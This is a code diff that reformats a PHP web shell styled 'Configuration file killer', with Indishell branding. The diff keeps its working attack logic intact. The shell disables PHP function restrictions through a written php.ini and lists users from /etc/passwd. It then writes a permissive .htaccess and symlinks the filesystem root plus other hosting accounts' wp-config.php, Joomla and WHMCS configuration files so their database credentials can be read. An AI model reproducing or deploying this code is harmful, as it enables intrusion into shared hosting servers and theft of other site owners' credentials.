@@ -120,9 +120,9 @@ function change_divst(id)
 </script>'; ?>
 <html>
 	<head>
-		<?php 
-		echo $head ;
-		echo '
+		<?php
+        echo $head ;
+        echo '
 
 <table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
 
@@ -144,7 +144,7 @@ function change_divst(id)
            </table>
         
 
-'; 
+';
 
 ?>
 <body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms"><div align=center><table><tr><td>Welcome Bhai ji :) .. Configuration file killer welcomes you _/\_ </font><br></td></tr></table>
@@ -154,75 +154,63 @@ function change_divst(id)
 	<input type=submit name="usre" value="use to Extract usernames" /></form>
 	
 	<?php
-	if(isset($_POST['ini']))
-	{
-		
-		$r=fopen('php.ini','w');
-		$rr=" disbale_functions=none ";
-		fwrite($r,$rr);
-		$link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>open this link in new tab to run PHP.INI</u></font></a>";
-		echo $link;
-		
-		}
-	
-	
-	
-	?>
+    if (isset($_POST['ini'])) {
+        $r=fopen('php.ini', 'w');
+        $rr=" disbale_functions=none ";
+        fwrite($r, $rr);
+        $link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>open this link in new tab to run PHP.INI</u></font></a>";
+        echo $link;
+    }
+    
+    
+    
+    ?>
 	
 	
 	<?php
-	if(isset($_POST['usre'])){
-		?><form method=post>
+    if (isset($_POST['usre'])) {
+        ?><form method=post>
 	<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
-foreach($users as $user)
-{
-$str=explode(":",$user);
-echo $str[0]."\n";
-}
-
-?></textarea><br><br>
+        foreach ($users as $user) {
+            $str=explode(":", $user);
+            echo $str[0]."\n";
+        } ?></textarea><br><br>
 	<input type=submit name=su value="bhaiyu ^_^ .. lets start" /></form>
-	<?php } ?>
 	<?php
-	error_reporting(0);
-	echo "<font color=red size=2 face=\"comic sans ms\">";
-	if(isset($_POST['su']))
-	{
-	mkdir('Indishell',0777);
-$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
-$g = fopen('Indishell/.htaccess','w');
-fwrite($g,$rr);
-$indishell = symlink("/","Indishell/root");
-		    $rt="<a href=Indishell/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
+    } ?>
+	<?php
+    error_reporting(0);
+    echo "<font color=red size=2 face=\"comic sans ms\">";
+    if (isset($_POST['su'])) {
+        mkdir('Indishell', 0777);
+        $rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+        $g = fopen('Indishell/.htaccess', 'w');
+        fwrite($g, $rr);
+        $indishell = symlink("/", "Indishell/root");
+        $rt="<a href=Indishell/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
         echo "Bhai ji .... check link given below for / folder symlink <br><u>$rt</u>";
-		
-		$dir=mkdir('INDISHELL',0777);
-		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
-        $f = fopen('INDISHELL/.htaccess','w');
+        
+        $dir=mkdir('INDISHELL', 0777);
+        $r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+        $f = fopen('INDISHELL/.htaccess', 'w');
    
-        fwrite($f,$r);
+        fwrite($f, $r);
         $consym="<a href=INDISHELL/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
-       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
-       	
-       		$usr=explode("\n",$_POST['user']);
-       	$configuration=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
-		foreach($usr as $uss )
-		{
-			$us=trim($uss);
-						
-			foreach($configuration as $c)
-			{
-			 $rs="/home/".$us."/public_html/".$c;
-			 $r="INDISHELL/".$us.$c;
-			 symlink($rs,$r);
-			
-		}
-			
-			}
-		
-		
-		}
-	
-	
-	
-	?>
+        echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
+           
+        $usr=explode("\n", $_POST['user']);
+        $configuration=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
+        foreach ($usr as $uss) {
+            $us=trim($uss);
+                        
+            foreach ($configuration as $c) {
+                $rs="/home/".$us."/public_html/".$c;
+                $r="INDISHELL/".$us.$c;
+                symlink($rs, $r);
+            }
+        }
+    }
+    
+    
+    
+    ?>
